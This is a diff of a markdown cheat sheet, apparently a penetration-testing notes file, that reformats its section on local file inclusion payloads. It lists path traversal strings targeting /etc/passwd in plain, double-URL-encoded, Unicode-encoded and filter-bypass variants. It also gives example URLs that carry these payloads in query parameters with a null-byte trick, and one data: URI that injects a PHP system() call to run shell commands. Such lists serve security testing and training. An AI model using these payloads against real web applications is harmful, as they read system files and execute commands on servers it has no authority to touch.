@@ -1105,20 +1105,24 @@ If it does not work you can also add a ?, this way the rest will be interpreted 
 -------------------------------------------------------------------------------------------------------------
 # Local file inclusion (LFI) payloads
 
-* normal
+#### normal
 
-`../../../../../../etc/passwd
-`
+```
+../../../../../../etc/passwd
+```
+```
+....//....//....//....//....//etc/passwd
+```
+#### double url encoding
+```
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+```
 
-`....//....//....//....//....//etc/passwd
-`
+#### with Unicode charecters
 
-* with Unicode charecters
-
-
-`
+```
 ..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8etc/passwd
-`
+```
 
 You can also try to use those insted of `/etc/passwd`
 ```
@@ -1143,9 +1147,9 @@ You can also try to use those insted of `/etc/passwd`
 
 # LFI examples
 
-*akech.com/index.php?token=`/etc/passwd%00`*
+*akech.xyz/index.php?token=`/etc/passwd%00`*
 
-*akrech.com/index.php?page=`../../../../../../etc/passwd`*
+*akrech.xyz/index.php?page=`../../../../../../etc/passwd`*
 
 ```
 http://www.test.com.ar/main.php?pagina=data:text/plain,<?system($_GET['x']);?>&x=ls
